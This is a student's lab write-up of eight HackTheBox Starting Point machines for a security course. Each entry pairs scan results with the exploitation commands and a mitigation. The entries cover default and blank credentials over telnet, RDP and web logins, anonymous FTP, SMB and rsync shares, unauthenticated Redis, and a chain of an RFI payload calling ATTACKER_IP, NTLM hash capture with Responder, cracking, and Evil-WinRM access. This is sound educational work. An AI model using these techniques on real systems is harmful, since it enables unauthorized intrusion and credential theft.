# Week 6: Penetration Testing — HackTheBox Starting Point

**MSCS Course Mapping:** SE6002 — Application Security + SE6013 — Software Security

## Objective

Apply a structured penetration testing methodology against live vulnerable machines on HackTheBox. Each machine teaches a different attack vector and service exploitation technique. The goal is to build the instinct of: scan → enumerate → exploit → capture the flag.

## Tools Used

- Nmap
- FTP, Telnet, SSH, RDP clients
- smbclient
- redis-cli
- mongosh
- Gobuster
- rsync
- Responder
- John the Ripper
- Evil-WinRM
- OpenVPN

## Methodology

Every machine followed the same structured approach:

1. **Reconnaissance** — connect to HTB VPN, identify target IP
2. **Scanning** — run Nmap to discover open ports and services
3. **Enumeration** — dig deeper into each service to find weaknesses
4. **Exploitation** — use the identified weakness to gain access
5. **Flag capture** — locate and retrieve the flag

---

## Machine Writeups

### 1. Meow (Very Easy — Linux)

**Scan Results:**
```
PORT   STATE SERVICE
23/tcp open  telnet   Linux telnetd
```

**Attack Vector:** Telnet with default credentials

**Methodology:** Nmap revealed only port 23 (Telnet) open. Telnet is an unencrypted remote access protocol that transmits everything in plaintext — including credentials. Connected using `telnet TARGET_IP` and attempted common default usernames. Logging in as `root` with no password granted immediate access.

**Key Takeaway:** Telnet should never be used in production environments. It provides no encryption, and default or empty credentials on administrative accounts are a critical vulnerability. SSH is the secure alternative.

**Flag Location:** `/root/flag.txt`

---

### 2. Fawn (Very Easy — Linux)

**Scan Results:**
```
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
| ftp-anon: Anonymous FTP login allowed
```

**Attack Vector:** FTP anonymous access

**Methodology:** Nmap identified FTP on port 21 with anonymous login enabled. Connected with `ftp TARGET_IP` using the username `anonymous` and no password. Listed directory contents with `ls` and found `flag.txt`. Downloaded it with `get flag.txt`.

**Key Takeaway:** Anonymous FTP access allows anyone to browse and download files without authentication. The Nmap `-sC` flag automatically detected this misconfiguration. In production, anonymous FTP should be disabled unless intentionally serving public files, and even then it should be read-only with no sensitive data.

**Flag Location:** FTP root directory

---

### 3. Dancing (Very Easy — Windows)

**Scan Results:**
```
PORT    STATE SERVICE
135/tcp open  msrpc
139/tcp open  netbios-ssn
445/tcp open  microsoft-ds
```

**Attack Vector:** SMB share with anonymous access

**Methodology:** Nmap revealed SMB on port 445. Enumerated available shares using `smbclient -L //TARGET_IP -N` which listed four shares: ADMIN$, C$, IPC$, and WorkShares. Connected to WorkShares without credentials using `smbclient //TARGET_IP/WorkShares -N`. Browsed user directories and found the flag.

**Key Takeaway:** SMB shares should require authentication and be restricted to authorized users. Anonymous access to file shares can expose sensitive corporate data. The `-N` flag in smbclient attempts a null session (no password), which is a standard enumeration technique.

**Flag Location:** WorkShares directory

---

### 4. Redeemer (Very Easy — Linux)

**Scan Results:**
```
PORT      STATE SERVICE VERSION
6379/tcp  open  redis   Redis key-value store
```

**Attack Vector:** Unauthenticated Redis access

**Methodology:** A full port scan (`nmap -p-`) was required as Redis runs on port 6379, which is outside Nmap's default top 1000 ports. Connected with `redis-cli -h TARGET_IP`. Listed databases with `INFO`, selected the relevant database, listed keys with `keys *`, and retrieved the flag with `get flag`.

**Key Takeaway:** Redis is an in-memory database often deployed without authentication by default. It should always require a password (`requirepass` in redis.conf) and be bound to localhost or behind a firewall. Exposed Redis instances have been exploited in the wild for cryptocurrency mining and data theft.

**Flag Location:** Redis key-value store

---

### 5. Explosion (Very Easy — Windows)

**Scan Results:**
```
PORT     STATE SERVICE
135/tcp  open  msrpc
139/tcp  open  netbios-ssn
445/tcp  open  microsoft-ds
3389/tcp open  ms-wbt-server (RDP)
```

**Attack Vector:** RDP with weak credentials

**Methodology:** Nmap revealed RDP on port 3389. Connected using `xfreerdp3 /v:TARGET_IP /u:Administrator /cert:ignore` and gained access to the Windows desktop with a blank administrator password. Located the flag on the desktop.

**Key Takeaway:** RDP exposed to the internet with weak or default credentials is one of the most common initial access vectors in real-world attacks. Ransomware groups frequently scan for open RDP ports. Mitigation includes strong passwords, Network Level Authentication (NLA), and restricting RDP access via VPN or firewall rules.

**Flag Location:** `C:\Users\Administrator\Desktop\flag.txt`

---

### 6. Preignition (Very Easy — Linux)

**Scan Results:**
```
PORT   STATE SERVICE VERSION
80/tcp open  http    nginx 1.14.2
```

**Attack Vector:** Directory brute forcing + default credentials

**Methodology:** Nmap found an HTTP server on port 80. Opened the site in a browser — it showed a default page with no obvious entry points. Used Gobuster to brute force directories: `gobuster dir -u http://TARGET_IP -w /usr/share/wordlists/dirb/common.txt -x php`. This discovered a hidden `admin.php` login page. Logged in with default credentials `admin:admin`.

**Key Takeaway:** Directory brute forcing (dir busting) is essential because web applications often have hidden pages that aren't linked from the main site. Default credentials should always be changed after deployment. Gobuster and similar tools are standard in any web application penetration test.

**Flag Location:** Admin panel after login

---

### 7. Synced (Very Easy — Linux)

**Scan Results:**
```
PORT    STATE SERVICE
873/tcp open  rsync
```

**Attack Vector:** Rsync anonymous access

**Methodology:** Nmap identified rsync on port 873. Listed available modules with `rsync --list-only rsync://TARGET_IP/` which revealed a `public` share described as "Anonymous Share". Downloaded the contents with `rsync rsync://TARGET_IP/public/flag.txt ./synced_flag.txt` and retrieved the flag.

**Key Takeaway:** Rsync is a file synchronization tool that can be configured to allow anonymous access. Like FTP and SMB, any file sharing service that permits unauthenticated access is a security risk. Rsync should require authentication and be restricted to specific IP ranges.

**Flag Location:** Public rsync module

---

### 8. Responder (Easy — Windows)

**Scan Results:**
```
PORT     STATE SERVICE
80/tcp   open  http
5985/tcp open  wsman (WinRM)
```

**Attack Vector:** RFI → NTLM hash capture → password cracking → WinRM access

**Methodology:** This machine required chaining multiple techniques together:

**Step 1 — Web Enumeration:** Nmap found HTTP on port 80 and WinRM on port 5985. Added `unika.htb` to `/etc/hosts` to resolve the hostname (virtual hosting). The website had a `page` parameter used for loading different language versions.

**Step 2 — Remote File Inclusion:** The `page` parameter was vulnerable to RFI. By changing the URL to `http://unika.htb/index.php?page=//ATTACKER_IP/somefile`, the server was forced to connect back to the attacker machine via SMB.

**Step 3 — Hash Capture:** Started Responder (`sudo responder -I tun0`) before triggering the RFI. When the server attempted the SMB connection, Responder captured the NTLMv2 hash containing the Administrator's credentials.

**Step 4 — Password Cracking:** Saved the captured hash and cracked it using John the Ripper with the rockyou wordlist: `john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt`. The password was recovered in seconds.

**Step 5 — Remote Access:** Used the cracked credentials to connect via Evil-WinRM: `evil-winrm -i TARGET_IP -u Administrator -p 'badminton'`. Searched the filesystem and found the flag.

**Key Takeaway:** This machine demonstrates how real attack chains work — no single vulnerability grants access, but combining web exploitation, protocol abuse, credential capture, and remote access results in full system compromise. NTLM relay and hash capture attacks are extremely common in corporate Windows environments. Mitigations include disabling NTLM where possible, enabling SMB signing, restricting outbound SMB traffic, and using strong passwords that resist dictionary attacks.

**Flag Location:** Found via filesystem search on C: drive

---

## Attack Vector Summary

| Machine | Service | Port | Attack Type | Difficulty |
|---------|---------|------|------------|------------|
| Meow | Telnet | 23 | Default credentials | Very Easy |
| Fawn | FTP | 21 | Anonymous access | Very Easy |
| Dancing | SMB | 445 | Null session share access | Very Easy |
| Redeemer | Redis | 6379 | Unauthenticated database | Very Easy |
| Explosion | RDP | 3389 | Weak credentials | Very Easy |
| Preignition | HTTP | 80 | Dir busting + default creds | Very Easy |
| Synced | Rsync | 873 | Anonymous file access | Very Easy |
| Responder | HTTP + WinRM | 80, 5985 | RFI → NTLM capture → cracking | Easy |

## Key Takeaways

- Every penetration test starts with scanning — Nmap is the foundation of reconnaissance
- The port number tells you what tool to use: 80 → browser, 21 → ftp, 445 → smbclient, 22 → ssh
- Default and weak credentials remain one of the most exploited vulnerabilities in the real world
- Services exposed without authentication (FTP, SMB, Redis, Rsync) are immediate wins for attackers
- Real-world attacks chain multiple techniques together — the Responder machine demonstrated this with five steps from initial web vulnerability to full system access
- Understanding the methodology matters more than memorizing commands — the tools can always be looked up

## Next Steps

Week 7 will shift to the defensive side, deploying a SIEM (Security Information and Event Management) system to detect the kinds of attacks practiced in this week.
